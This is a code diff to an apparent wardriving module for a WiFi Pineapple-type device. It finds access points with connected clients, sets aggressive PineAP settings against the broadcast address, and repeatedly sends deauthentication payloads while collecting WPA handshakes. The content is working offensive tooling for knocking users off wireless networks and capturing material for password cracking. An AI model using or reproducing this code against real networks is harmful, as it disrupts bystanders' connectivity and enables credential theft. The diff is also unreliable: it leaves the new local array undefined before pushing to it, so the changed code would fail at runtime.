@@ -477,11 +477,11 @@
             this.get_status_file(statusFileName);
             //this.render_status();
         };
-        WarDriverComponent.prototype.attackd = function () {
+        WarDriverComponent.prototype.attackd = function (scanResultsArray) {
             var _this = this;
             this.API.APIGet('/api/pineap/handshakes', function (resp) {
                 if (resp.handshakes != null) {
-                    _this.scanResultsArray.forEach(function (ap) {
+                    scanResultsArray.forEach(function (ap) {
                         var ap_deauth_payload = {
                             bssid: ap.bssid,
                             multiplier: 1,
@@ -525,7 +525,7 @@
                 });
             }, 20000);
             if (this.continousDeauth) {
-                this.attackd();
+                this.attackd(scanResultsArray);
             }
         };
         WarDriverComponent.prototype.run_scand = function () {
@@ -555,6 +555,7 @@
                     'target_mac': 'FF:FF:FF:FF:FF:FF'
                 }
             };
+            var scanResultsArray;
             this.API.APIPut('/api/pineap/settings', pineAP_aggro_settings, function (resp) {
                 _this.API.APIPost('/api/recon/stop', null, function (resp) {
                     _this.API.APIPost('/api/recon/start', scan_opts, function (resp) {
@@ -567,7 +568,7 @@
                                         if (ap.clients != null) {
                                             ap.clients.forEach(function (client) {
                                                 console.log('>client found!: ' + client.client_mac);
-                                                _this.scanResultsArray.push(ap);
+                                                scanResultsArray.push(ap);
                                             });
                                         }
                                         else {
@@ -579,8 +580,8 @@
                                     console.log('>no APs found');
                                 }
                                 _this.API.APIPost('/api/recon/stop', null, function (resp) {
-                                    if (_this.scanResultsArray != null)
-                                        _this.attackd();
+                                    if (scanResultsArray != null)
+                                        _this.attackd(scanResultsArray);
                                     else
                                         console.log('>sorry, nothing to attack');
                                 });
